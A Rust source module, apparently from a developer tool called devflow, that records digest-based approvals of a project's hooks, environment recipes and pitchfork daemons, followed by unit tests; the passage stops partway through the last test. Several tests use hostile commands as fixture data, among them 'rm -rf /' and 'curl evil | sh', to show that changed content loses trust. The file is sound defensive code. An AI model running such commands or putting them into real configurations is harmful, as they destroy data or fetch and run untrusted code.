//! Trust: approval of the exact scope a project asks to run, per project
//! checkout.
//!
//! What an approval covers is [`Scope`] (version 2): the `[hooks]` commands,
//! the `[env]` recipes and presets, and the project's pitchfork
//! configuration. Approvals live in `<config dir>/trust.toml`, keyed by
//! project id *and* main-checkout path, so approving a clone does not
//! approve another clone of the same repository. An entry records the scope
//! version it was made under: an approval of another version (version 1
//! covered `[hooks]` alone) never authorizes the current scope.
//!
//! A project keeps **several** approved digests (up to [`MAX_APPROVALS`]):
//! each workspace has its own scope (its branch's recipes and its own
//! pitchfork files), and any workspace whose scope digest is in the set is
//! trusted, so approving one workspace never revokes another's approval.
//! Approving adds the current scope's digest (identical content is approved
//! once), `revoke` removes it, `revoke_all` removes the project's whole set,
//! and beyond the bound the oldest approvals are dropped, never the one being
//! made. An earlier build's single entry is simply the first element.
use crate::project::Project;
pub use crate::scope::{
    EnvScope, HookScope, HooksScope, ProcessesScope, Scope, ScopeSection, Trigger, VERSION,
};
use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// The most approvals a project keeps: beyond it the oldest are dropped
/// (never the one just made).
pub const MAX_APPROVALS: usize = 20;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "state", rename_all = "snake_case")]
pub enum TrustState {
    /// The scope holds nothing that runs or configures anything: no hook
    /// command, no `[env]`, no pitchfork configuration.
    NothingToApprove,
    Trusted,
    /// Never approved, or approved content has changed since.
    Untrusted {
        /// The digest of the scope as it is now.
        digest: String,
        /// An approval exists, but not for this scope.
        previously_trusted: bool,
        /// That approval was made under an earlier scope version, which
        /// covered less: review the scope again.
        format_changed: bool,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Entry {
    project_id: uuid::Uuid,
    root: PathBuf,
    digest: String,
    approved_at: DateTime<Utc>,
    /// The scope version the digest is of; entries written before versions
    /// existed are version 1.
    #[serde(default = "first_version")]
    version: u32,
}

fn first_version() -> u32 {
    1
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct File {
    #[serde(default, rename = "approval")]
    approvals: Vec<Entry>,
}

/// Everything one approval covers for `project`: its hooks and `[env]`, and
/// the pitchfork files of its main checkout. Frontends show all of it, then
/// approve exactly this content. For the scope of one workspace see
/// [`scope_at`].
pub fn scope(project: &Project) -> Scope {
    scope_at(project, &project.root)
}

/// The scope of the workspace at `dir` (a worktree of the project, or its
/// main checkout): the recipes `dir` runs (its own branch's `[hooks]` and
/// `[env]`, or the main checkout's for the main checkout and for a workspace
/// that chose the default recipes; see [`crate::effective`]) and the pitchfork
/// files of `dir` itself, since pitchfork runs what the directory it starts in
/// says. A workspace whose recipes equal the main checkout's has the same
/// digest as before recipes were per workspace.
pub fn scope_at(project: &Project, dir: &Path) -> Scope {
    let project = project.at(dir);
    // The namespace and label devflow generated for this workspace are not
    // part of what runs; any other value of either is.
    let identity = crate::processes::generated_identity(&project, dir);
    Scope::build_with(&project.config, dir, identity.as_ref())
}

/// The digest of [`scope`].
pub fn digest(project: &Project) -> String {
    scope(project).digest
}

/// The digest of [`scope_at`].
pub fn digest_at(project: &Project, dir: &Path) -> String {
    scope_at(project, dir).digest
}

/// Whether the main checkout's scope is approved; see [`state_at`].
pub fn state(project: &Project) -> Result<TrustState> {
    state_in(&crate::paths::config_dir()?, project)
}

/// Whether the scope of the workspace at `dir` is approved. An approval is
/// kept per project and main checkout, and the digest it holds is compared
/// with the scope of `dir`: approving one workspace does not approve another
/// whose pitchfork files differ.
pub fn state_at(project: &Project, dir: &Path) -> Result<TrustState> {
    state_of(
        &crate::paths::config_dir()?,
        project,
        scope_at(project, dir),
    )
}

/// Record approval of the current scope of the main checkout (read once; the
/// digest saved is that of what was read).
pub fn approve(project: &Project) -> Result<()> {
    approve_in(&crate::paths::config_dir()?, project)
}

/// Withdraw the approval of the scope of the workspace at `dir` (its digest
/// only: the project's other approvals stand). `false` when it was not
/// approved.
pub fn revoke_at(project: &Project, dir: &Path) -> Result<bool> {
    let scope = scope_at(project, dir);
    revoke_in(&crate::paths::config_dir()?, project, &scope.digest)
}

/// Withdraw every approval of the project (every digest, every scope
/// version). Returns how many there were.
pub fn revoke_all(project: &Project) -> Result<usize> {
    revoke_all_in(&crate::paths::config_dir()?, project)
}

/// An approval on record, for display.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Approved {
    pub digest: String,
    /// The scope version it was made under; one that is not [`VERSION`]
    /// authorizes nothing.
    pub version: u32,
    pub approved_at: DateTime<Utc>,
}

/// The project's approvals, oldest first.
pub fn approvals(project: &Project) -> Result<Vec<Approved>> {
    approvals_in(&crate::paths::config_dir()?, project)
}

/// Approve the content the user reviewed, as the main checkout's scope; see
/// [`approve_scope_at`].
pub fn approve_scope(project: &Project, reviewed: &Scope) -> Result<()> {
    approve_scope_at(project, &project.root, reviewed)
}

/// Approve the content the user reviewed: the scope of the workspace at
/// `dir`. Re-reads the configuration and fails if the scope changed since
/// `reviewed` was taken, so an approval never covers hooks, recipes or
/// processes nobody saw. What is saved is the reviewed digest and version
/// themselves, validated here, never a scope read again afterwards: a file
/// replaced after the check leaves the approval of what was shown, which then
/// no longer matches what is on disk.
pub fn approve_scope_at(project: &Project, dir: &Path, reviewed: &Scope) -> Result<()> {
    approve_scope_in(&crate::paths::config_dir()?, project, dir, reviewed)
}

fn approve_scope_in(
    config_dir: &Path,
    project: &Project,
    dir: &Path,
    reviewed: &Scope,
) -> Result<()> {
    let mut current = project.reload()?;
    if let Some(why) = reviewed.processes.unapprovable() {
        anyhow::bail!("{why}");
    }
    // Read again from disk, whichever project the review used: the scope of
    // `dir` as it is now. A review made with the default workspace's recipes
    // chosen for `dir` (the choice is about to be recorded) is of that scope.
    if matches!(
        project.at(dir).recipes(),
        crate::effective::RecipesSource::DefaultChosen { .. }
    ) {
        current = current.at_choosing(dir, true);
    }
    let now = scope_at(&current, dir);
    anyhow::ensure!(
        now.digest == reviewed.digest && now.version == reviewed.version,
        "what {} asks to run (hooks, [env] or pitchfork processes) changed since it was shown; \
         review it again",
        current
            .at(dir)
            .recipes()
            .file()
            .unwrap_or(&current.config_path)
            .display()
    );
    #[cfg(test)]
    tests::after_check();
    save_in(config_dir, &current, &reviewed.digest, reviewed.version)
}

/// `DEVFLOW_TRUST_HOOKS=1` trusts hooks for one run (CI, agents).
pub fn env_override() -> bool {
    std::env::var("DEVFLOW_TRUST_HOOKS").is_ok_and(|v| v == "1" || v == "true")
}

/// A person's approval of one reviewed [`Scope`] for one operation.
///
/// It carries the digest and version of what was shown, never a bare "yes":
/// an operation compares it with the scope of the workspace it acts on, after
/// that workspace's files exist and before anything runs, so content the
/// person did not see (an existing branch with other hooks, a pitchfork file
/// that changed) is not run on the strength of a review of something else.
/// A one-time approval is just this value, handed to the operation and never
/// stored; "trust and run" stores the approval ([`approve_scope_at`]) and also
/// hands the operation this value.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Approval {
    digest: String,
    version: u32,
}

impl Approval {
    /// The approval of exactly `reviewed`.
    pub fn of(reviewed: &Scope) -> Approval {
        Approval {
            digest: reviewed.digest.clone(),
            version: reviewed.version,
        }
    }

    /// The digest that was reviewed.
    pub fn digest(&self) -> &str {
        &self.digest
    }

    /// Whether `scope` is exactly what was reviewed. A scope with a file too
    /// large to hash is never covered: its digest does not stand for its content.
    pub fn covers(&self, scope: &Scope) -> bool {
        scope.processes.unapprovable().is_none()
            && scope.version == self.version
            && scope.digest == self.digest
    }
}

/// Whether the content of one workspace may run, for one operation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// `DEVFLOW_TRUST_HOOKS` is set, the approval on record covers the
    /// workspace's scope, or the operation's [`Approval`] does.
    Approved,
    /// Nothing approves it.
    NotApproved,
    /// The operation was given an [`Approval`] for other content than the
    /// workspace has, and nothing else approves it.
    Differs,
}

impl Verdict {
    pub fn approved(self) -> bool {
        self == Verdict::Approved
    }
}

/// Decide whether the scope of the workspace at `dir` may run now. The
/// environment override and the approval on record come first (the latter is
/// compared with `dir`'s own scope); then the operation's `approval`, which
/// must cover that same scope.
pub fn verdict_at(project: &Project, dir: &Path, approval: Option<&Approval>) -> Result<Verdict> {
    verdict_in(&crate::paths::config_dir()?, project, dir, approval)
}

fn verdict_in(
    config_dir: &Path,
    project: &Project,
    dir: &Path,
    approval: Option<&Approval>,
) -> Result<Verdict> {
    if env_override() {
        return Ok(Verdict::Approved);
    }
    let scope = scope_at(project, dir);
    if matches!(
        state_of(config_dir, project, scope.clone())?,
        TrustState::Trusted
    ) {
        return Ok(Verdict::Approved);
    }
    Ok(match approval {
        Some(approval) if approval.covers(&scope) => Verdict::Approved,
        Some(_) => Verdict::Differs,
        None => Verdict::NotApproved,
    })
}

fn state_in(dir: &Path, project: &Project) -> Result<TrustState> {
    state_of(dir, project, scope(project))
}

fn state_of(dir: &Path, project: &Project, scope: Scope) -> Result<TrustState> {
    if scope.is_empty() {
        return Ok(TrustState::NothingToApprove);
    }
    let file = read(dir)?;
    let mine: Vec<&Entry> = file
        .approvals
        .iter()
        .filter(|e| matches(e, project))
        .collect();
    // A file too large to hash makes the digest blind to its content: nothing
    // is ever trusted on it.
    let bindable = scope.processes.unapprovable().is_none();
    if bindable
        && mine
            .iter()
            .any(|e| e.version == VERSION && e.digest == scope.digest)
    {
        return Ok(TrustState::Trusted);
    }
    Ok(TrustState::Untrusted {
        digest: scope.digest,
        previously_trusted: !mine.is_empty(),
        // Every approval on record is of an earlier scope version, which
        // covered less.
        format_changed: !mine.is_empty() && mine.iter().all(|e| e.version != VERSION),
    })
}

fn approve_in(dir: &Path, project: &Project) -> Result<()> {
    let scope = scope(project);
    if let Some(why) = scope.processes.unapprovable() {
        anyhow::bail!("{why}");
    }
    save_in(dir, project, &scope.digest, scope.version)
}

/// Store `digest` (of scope `version`) as an approval of `project`, as given.
/// An approval of the same content is replaced, not repeated (it becomes the
/// newest); approvals made under another scope version, which authorize
/// nothing, are dropped; beyond [`MAX_APPROVALS`] the oldest go, never this one.
fn save_in(dir: &Path, project: &Project, digest: &str, version: u32) -> Result<()> {
    with_lock(dir, || {
        let mut file = read(dir)?;
        file.approvals
            .retain(|e| !matches(e, project) || (e.version == VERSION && e.digest != digest));
        file.approvals.push(Entry {
            project_id: project.id(),
            root: project.root.clone(),
            digest: digest.to_string(),
            approved_at: Utc::now(),
            version,
        });
        prune(&mut file, project, digest);
        write(dir, &file)
    })
}

/// Keep at most [`MAX_APPROVALS`] approvals of `project`: the oldest go first
/// and the one for `keep` never does.
fn prune(file: &mut File, project: &Project, keep: &str) {
    let mine = file
        .approvals
        .iter()
        .filter(|e| matches(e, project))
        .count();
    let mut excess = mine.saturating_sub(MAX_APPROVALS);
    if excess == 0 {
        return;
    }
    let mut order: Vec<usize> = (0..file.approvals.len())
        .filter(|&i| matches(&file.approvals[i], project) && file.approvals[i].digest != keep)
        .collect();
    order.sort_by_key(|&i| (file.approvals[i].approved_at, i));
    let mut drop = Vec::new();
    for index in order {
        if excess == 0 {
            break;
        }
        drop.push(index);
        excess -= 1;
    }
    let mut index = 0;
    file.approvals.retain(|_| {
        let keep = !drop.contains(&index);
        index += 1;
        keep
    });
}

fn revoke_in(dir: &Path, project: &Project, digest: &str) -> Result<bool> {
    with_lock(dir, || {
        let mut file = read(dir)?;
        let before = file.approvals.len();
        file.approvals
            .retain(|e| !(matches(e, project) && e.digest == digest));
        let removed = file.approvals.len() != before;
        if removed {
            write(dir, &file)?;
        }
        Ok(removed)
    })
}

fn revoke_all_in(dir: &Path, project: &Project) -> Result<usize> {
    with_lock(dir, || {
        let mut file = read(dir)?;
        let before = file.approvals.len();
        file.approvals.retain(|e| !matches(e, project));
        let removed = before - file.approvals.len();
        if removed > 0 {
            write(dir, &file)?;
        }
        Ok(removed)
    })
}

fn approvals_in(dir: &Path, project: &Project) -> Result<Vec<Approved>> {
    let mut approvals: Vec<Approved> = read(dir)?
        .approvals
        .into_iter()
        .filter(|e| matches(e, project))
        .map(|e| Approved {
            digest: e.digest,
            version: e.version,
            approved_at: e.approved_at,
        })
        .collect();
    approvals.sort_by_key(|a| a.approved_at);
    Ok(approvals)
}

/// The file holds every project's approvals, so writers take a lock.
fn with_lock<T>(dir: &Path, change: impl FnOnce() -> Result<T>) -> Result<T> {
    crate::fsutil::with_lock(&dir.join("trust.lock"), change)
}

fn matches(entry: &Entry, project: &Project) -> bool {
    entry.project_id == project.id() && entry.root == project.root
}

fn path(dir: &Path) -> PathBuf {
    dir.join("trust.toml")
}

fn read(dir: &Path) -> Result<File> {
    let path = path(dir);
    match std::fs::read_to_string(&path) {
        Ok(text) => toml::from_str(&text).with_context(|| format!("invalid {}", path.display())),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(File::default()),
        Err(e) => Err(e).with_context(|| format!("cannot read {}", path.display())),
    }
}

fn write(dir: &Path, file: &File) -> Result<()> {
    let text = toml::to_string_pretty(file)?;
    crate::fsutil::write_atomic(&path(dir), text.as_bytes(), false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::worktree::testutil;
    use std::cell::RefCell;

    type Hook = Box<dyn FnOnce()>;

    thread_local! {
        static AFTER_CHECK: RefCell<Option<Hook>> = const { RefCell::new(None) };
    }

    /// Run once, between the check of a reviewed scope and its save.
    pub(super) fn after_check() {
        if let Some(hook) = AFTER_CHECK.with(|h| h.borrow_mut().take()) {
            hook();
        }
    }

    fn with_hooks(setup: &[&str]) -> (testutil::TestRepo, Project) {
        let t = testutil::repo(None);
        let mut project = t.project.clone();
        project.config.hooks.setup = setup.iter().map(|s| (*s).into()).collect();
        (t, project)
    }

    /// Write `devflow.toml` and `pitchfork.toml` pieces to disk and reopen.
    fn reopen(t: &testutil::TestRepo, hooks: &str, env: &str) -> Project {
        let id = t.project.id();
        std::fs::write(
            t.root.join("devflow.toml"),
            format!("[project]\nname = \"shop\"\nid = \"{id}\"\n{hooks}\n{env}\n"),
        )
        .unwrap();
        Project::open(&t.root).unwrap()
    }

    fn untrusted(state: TrustState) -> (bool, bool) {
        match state {
            TrustState::Untrusted {
                previously_trusted,
                format_changed,
                ..
            } => (previously_trusted, format_changed),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn nothing_is_approved_only_when_the_whole_scope_is_empty() {
        let dir = tempfile::tempdir().unwrap();
        let (t, project) = with_hooks(&[]);
        assert_eq!(
            state_in(dir.path(), &project).unwrap(),
            TrustState::NothingToApprove
        );
        // Any one part of the scope is something to approve: a teardown
        // command, an [env] recipe, a pitchfork daemon.
        let teardown = reopen(&t, "[hooks]\nteardown = [\"make clean\"]", "");
        assert_eq!(
            untrusted(state_in(dir.path(), &teardown).unwrap()),
            (false, false)
        );
        let env = reopen(&t, "", "[env]\nA = \"1\"");
        assert_eq!(
            untrusted(state_in(dir.path(), &env).unwrap()),
            (false, false)
        );
        let plain = reopen(&t, "", "");
        assert_eq!(
            state_in(dir.path(), &plain).unwrap(),
            TrustState::NothingToApprove
        );
        std::fs::write(
            t.root.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"echo\"\n",
        )
        .unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &plain).unwrap()),
            (false, false)
        );
        // No setup commands, and still not "trusted without approval".
        assert!(plain.config.hooks.setup.is_empty());
    }

    #[test]
    fn approval_tracks_exact_content() {
        let dir = tempfile::tempdir().unwrap();
        let (_t, mut project) = with_hooks(&["bun install"]);
        let expected = digest(&project);
        assert_eq!(
            state_in(dir.path(), &project).unwrap(),
            TrustState::Untrusted {
                digest: expected.clone(),
                previously_trusted: false,
                format_changed: false,
            }
        );
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);

        project.config.hooks.setup.push("rm -rf /".into());
        match state_in(dir.path(), &project).unwrap() {
            TrustState::Untrusted {
                digest,
                previously_trusted,
                format_changed,
            } => {
                assert!(previously_trusted && !format_changed);
                assert_ne!(digest, expected);
            }
            other => panic!("{other:?}"),
        }

        // Approving the changed content adds an approval; the earlier one
        // stands, so going back to what was approved is trusted again.
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        let text = std::fs::read_to_string(dir.path().join("trust.toml")).unwrap();
        assert_eq!(text.matches("[[approval]]").count(), 2, "{text}");
        assert!(text.contains("version = 2"), "{text}");
        project.config.hooks.setup.pop();
        assert_eq!(digest(&project), expected);
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        // Identical content is approved once.
        approve_in(dir.path(), &project).unwrap();
        let text = std::fs::read_to_string(dir.path().join("trust.toml")).unwrap();
        assert_eq!(text.matches("[[approval]]").count(), 2, "{text}");

        // Revoking withdraws the scope in hand, not the project's others.
        assert!(revoke_in(dir.path(), &project, &expected).unwrap());
        assert!(!revoke_in(dir.path(), &project, &expected).unwrap());
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (true, false),
            "the other approval is still on record"
        );
        assert_eq!(revoke_all_in(dir.path(), &project).unwrap(), 1);
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (false, false)
        );
    }

    #[test]
    fn a_project_keeps_a_bounded_set_of_approvals_and_drops_the_oldest_first() {
        let dir = tempfile::tempdir().unwrap();
        let (_t, project) = with_hooks(&["make"]);
        let (_u, other) = with_hooks(&["make"]);
        let digest = |n: usize| format!("{n:064x}");
        for n in 0..MAX_APPROVALS + 5 {
            save_in(dir.path(), &project, &digest(n), VERSION).unwrap();
        }
        // Another project's approvals are its own: neither counted nor pruned.
        save_in(dir.path(), &other, &digest(999), VERSION).unwrap();
        let kept: Vec<String> = approvals_in(dir.path(), &project)
            .unwrap()
            .into_iter()
            .map(|a| a.digest)
            .collect();
        assert_eq!(kept.len(), MAX_APPROVALS);
        assert_eq!(kept.first(), Some(&digest(5)), "the five oldest went");
        assert_eq!(kept.last(), Some(&digest(MAX_APPROVALS + 4)));
        assert_eq!(approvals_in(dir.path(), &other).unwrap().len(), 1);

        // Approving again an approval that is still there makes it the newest,
        // so it is not the next to go.
        save_in(dir.path(), &project, &digest(5), VERSION).unwrap();
        save_in(dir.path(), &project, &digest(1000), VERSION).unwrap();
        let kept: Vec<String> = approvals_in(dir.path(), &project)
            .unwrap()
            .into_iter()
            .map(|a| a.digest)
            .collect();
        assert_eq!(kept.len(), MAX_APPROVALS);
        assert!(kept.contains(&digest(5)));
        assert!(!kept.contains(&digest(6)));
        assert_eq!(kept.last(), Some(&digest(1000)));
    }

    #[test]
    fn pruning_never_drops_the_scope_being_approved() {
        let dir = tempfile::tempdir().unwrap();
        let (_t, project) = with_hooks(&["make"]);
        // A clock that went back: every approval on record is dated after now.
        let future = "2099-01-01T00:00:00Z";
        let old: String = (0..MAX_APPROVALS)
            .map(|n| {
                format!(
                    "[[approval]]\nproject_id = \"{}\"\nroot = {:?}\ndigest = \"{n:064x}\"\n\
                     approved_at = \"{future}\"\nversion = 2\n\n",
                    project.id(),
                    project.root.display().to_string(),
                )
            })
            .collect();
        std::fs::write(dir.path().join("trust.toml"), old).unwrap();
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        assert_eq!(
            approvals_in(dir.path(), &project).unwrap().len(),
            MAX_APPROVALS
        );
    }

    #[test]
    fn revoking_one_scope_leaves_the_rest_and_revoking_all_leaves_other_projects() {
        let dir = tempfile::tempdir().unwrap();
        let (_t, project) = with_hooks(&["make"]);
        let (_u, other) = with_hooks(&["make"]);
        let digest = |n: usize| format!("{n:064x}");
        for n in 0..3 {
            save_in(dir.path(), &project, &digest(n), VERSION).unwrap();
        }
        save_in(dir.path(), &other, &digest(0), VERSION).unwrap();
        assert!(revoke_in(dir.path(), &project, &digest(1)).unwrap());
        assert!(!revoke_in(dir.path(), &project, &digest(1)).unwrap());
        assert_eq!(approvals_in(dir.path(), &project).unwrap().len(), 2);
        assert_eq!(revoke_all_in(dir.path(), &project).unwrap(), 2);
        assert_eq!(revoke_all_in(dir.path(), &project).unwrap(), 0);
        assert_eq!(
            approvals_in(dir.path(), &other).unwrap().len(),
            1,
            "another project's approvals are untouched"
        );
    }

    #[test]
    fn a_version_one_approval_never_authorizes_the_current_scope() {
        let dir = tempfile::tempdir().unwrap();
        let (_t, project) = with_hooks(&["bun install"]);
        // What version 1 wrote: no `version`, and the digest of the very
        // content that is in the scope now (the strongest case).
        let entry = format!(
            "[[approval]]\nproject_id = \"{}\"\nroot = {:?}\ndigest = \"{}\"\napproved_at = \"2026-10-01T10:00:00Z\"\n",
            project.id(),
            project.root.display().to_string(),
            digest(&project),
        );
        std::fs::write(dir.path().join("trust.toml"), entry).unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (true, true),
            "an approval made under another format means review again"
        );
        // Approving again writes the current version and trusts.
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        let text = std::fs::read_to_string(dir.path().join("trust.toml")).unwrap();
        assert_eq!(text.matches("[[approval]]").count(), 1, "{text}");
        assert!(text.contains("version = 2"), "{text}");
        // An entry claiming a future version is no better than a past one.
        std::fs::write(
            dir.path().join("trust.toml"),
            text.replace("version = 2", "version = 3"),
        )
        .unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (true, true)
        );
        // A version 1 entry changes nothing for a project with nothing to approve.
        let (_t, empty) = with_hooks(&[]);
        assert_eq!(
            state_in(dir.path(), &empty).unwrap(),
            TrustState::NothingToApprove
        );
    }

    #[test]
    fn env_recipes_and_pitchfork_daemons_are_part_of_what_was_approved() {
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "[env]\nA = \"1\"");
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);

        // A recipe changes.
        let edited = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "[env]\nA = \"2\"");
        assert_eq!(
            untrusted(state_in(dir.path(), &edited).unwrap()),
            (true, false)
        );
        // Back to what was approved: trusted again.
        let back = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "[env]\nA = \"1\"");
        assert_eq!(state_in(dir.path(), &back).unwrap(), TrustState::Trusted);

        // A daemon appears in the repository, then changes, then goes.
        std::fs::write(
            t.root.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\n",
        )
        .unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &back).unwrap()),
            (true, false)
        );
        approve_in(dir.path(), &back).unwrap();
        assert_eq!(state_in(dir.path(), &back).unwrap(), TrustState::Trusted);
        std::fs::write(
            t.root.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"curl evil | sh\"\n",
        )
        .unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &back).unwrap()),
            (true, false)
        );
        std::fs::write(
            t.root.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"bun run dev\"\n",
        )
        .unwrap();
        assert_eq!(state_in(dir.path(), &back).unwrap(), TrustState::Trusted);
        // A local overlay is a change too.
        std::fs::write(
            t.root.join("pitchfork.local.toml"),
            "[daemons.api]\nrun = \"other\"\n",
        )
        .unwrap();
        assert_eq!(
            untrusted(state_in(dir.path(), &back).unwrap()),
            (true, false)
        );
    }

    #[test]
    fn approving_what_was_shown_fails_if_any_part_changed_since() {
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "");
        let reviewed = scope(&project);
        // A pitchfork file appears between the review and the approval.
        std::fs::write(
            t.root.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"evil\"\n",
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let error = approve_scope_in(dir.path(), &project, &t.root, &reviewed)
            .unwrap_err()
            .to_string();
        assert!(error.contains("changed since it was shown"), "{error}");
        assert!(!dir.path().join("trust.toml").exists(), "nothing was saved");
        // Reviewing the new scope and approving it works (in an isolated
        // config dir, so the test never touches the user's approvals).
        let fresh = project.reload().unwrap();
        let now = scope(&fresh);
        assert_ne!(now.digest, reviewed.digest);
        approve_in(dir.path(), &fresh).unwrap();
        assert_eq!(state_in(dir.path(), &fresh).unwrap(), TrustState::Trusted);
    }

    #[test]
    fn approval_saves_the_reviewed_digest_even_if_a_file_changes_after_the_check() {
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "");
        let daemon = t.root.join("pitchfork.toml");
        std::fs::write(&daemon, "[daemons.api]\nrun = \"bun run dev\"\n").unwrap();
        let reviewed = scope(&project);
        // The file is replaced after the digest was validated and before it
        // is stored.
        let swapped = daemon.clone();
        AFTER_CHECK.with(|h| {
            *h.borrow_mut() = Some(Box::new(move || {
                std::fs::write(&swapped, "[daemons.api]\nrun = \"curl evil | sh\"\n").unwrap();
            }));
        });
        approve_scope_in(dir.path(), &project, &t.root, &reviewed).unwrap();
        let stored = read(dir.path()).unwrap();
        assert_eq!(stored.approvals.len(), 1);
        assert_eq!(
            (
                stored.approvals[0].digest.as_str(),
                stored.approvals[0].version
            ),
            (reviewed.digest.as_str(), reviewed.version),
            "what was reviewed is what is stored"
        );
        assert_ne!(scope(&project).digest, reviewed.digest);
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (true, false),
            "the replaced file is not approved"
        );
    }

    #[test]
    fn approval_compares_the_scope_of_the_workspace_it_is_for() {
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nswitch = [\"echo in\"]", "");
        // The branch carries the same recipes: they are committed.
        testutil::commit_all(&project.repo().unwrap(), "hooks");
        let linked = crate::worktree::create(&project, "feature/a", None).unwrap();
        let daemon = "[daemons.api]\nrun = \"bun run dev\"\n";
        std::fs::write(t.root.join("pitchfork.toml"), daemon).unwrap();
        std::fs::write(linked.path.join("pitchfork.toml"), daemon).unwrap();
        let state_at = |dir_: &Path| state_of(dir.path(), &project, scope_at(&project, dir_));

        // The main checkout is approved; the worktree has the same file.
        approve_scope_in(dir.path(), &project, &t.root, &scope(&project)).unwrap();
        assert_eq!(state_at(&t.root).unwrap(), TrustState::Trusted);
        assert_eq!(state_at(&linked.path).unwrap(), TrustState::Trusted);

        // The worktree's daemon changes: the main checkout's approval does not
        // cover it, and the main checkout stays approved.
        std::fs::write(
            linked.path.join("pitchfork.toml"),
            "[daemons.api]\nrun = \"curl evil | sh\"\n",
        )
        .unwrap();
        assert_eq!(state_at(&t.root).unwrap(), TrustState::Trusted);
        assert_eq!(untrusted(state_at(&linked.path).unwrap()), (true, false));
        assert_ne!(
            scope_at(&project, &linked.path).digest,
            scope(&project).digest
        );

        // Reviewing the worktree's scope and approving it is per worktree: the
        // reviewed scope must still be the worktree's.
        let reviewed = scope_at(&project, &linked.path);
        let error = approve_scope_in(dir.path(), &project, &t.root, &reviewed)
            .unwrap_err()
            .to_string();
        assert!(error.contains("changed since it was shown"), "{error}");
        approve_scope_in(dir.path(), &project, &linked.path, &reviewed).unwrap();
        assert_eq!(state_at(&linked.path).unwrap(), TrustState::Trusted);
        // Approvals are kept per digest: approving the worktree's scope did not
        // revoke the main checkout's.
        assert_eq!(state_at(&t.root).unwrap(), TrustState::Trusted);
        assert_eq!(state_at(&linked.path).unwrap(), TrustState::Trusted);
        assert_eq!(approvals_in(dir.path(), &project).unwrap().len(), 2);
    }

    #[test]
    fn a_change_after_a_long_run_of_comments_revokes_the_approval() {
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "", "");
        let padding = format!(
            "# {}\n",
            "x".repeat(crate::pitchfork_scope::MAX_BYTES as usize + 16)
        );
        let write = |run: &str| {
            std::fs::write(
                t.root.join("pitchfork.toml"),
                format!("{padding}[daemons.api]\nrun = \"{run}\"\n"),
            )
            .unwrap();
        };
        write("bun run dev");
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        write("curl evil | sh");
        assert_eq!(
            untrusted(state_in(dir.path(), &project).unwrap()),
            (true, false)
        );
    }

    #[test]
    fn a_file_too_large_to_hash_is_never_trusted_or_approved() {
        use crate::pitchfork_scope::Layer;
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nsetup = [\"make\"]", "");
        approve_in(dir.path(), &project).unwrap();
        assert_eq!(state_in(dir.path(), &project).unwrap(), TrustState::Trusted);
        // The same digest, with a layer that no digest can stand for.
        let mut huge = scope(&project);
        huge.processes.layers.push(Layer {
            file: "pitchfork.toml".into(),
            daemons: Vec::new(),
            shared: Default::default(),
            problem: Some("is larger than 256 MiB and cannot be approved".into()),
            sha256: None,
            unbound: true,
        });
        assert!(matches!(
            state_of(dir.path(), &project, huge.clone()).unwrap(),
            TrustState::Untrusted { .. }
        ));
        let error = approve_scope_in(dir.path(), &project, &t.root, &huge)
            .unwrap_err()
            .to_string();
        assert!(
            error.contains("pitchfork.toml") && error.contains("too large"),
            "{error}"
        );
    }

    #[test]
    fn approvals_are_per_checkout_and_per_project() {
        let dir = tempfile::tempdir().unwrap();
        let (_a, project_a) = with_hooks(&["make"]);
        let (_b, mut project_b) = with_hooks(&["make"]);
        // A second clone of the same project: same id and hooks, other path.
        project_b.config.project.id = project_a.config.project.id;
        approve_in(dir.path(), &project_a).unwrap();
        assert_eq!(
            state_in(dir.path(), &project_a).unwrap(),
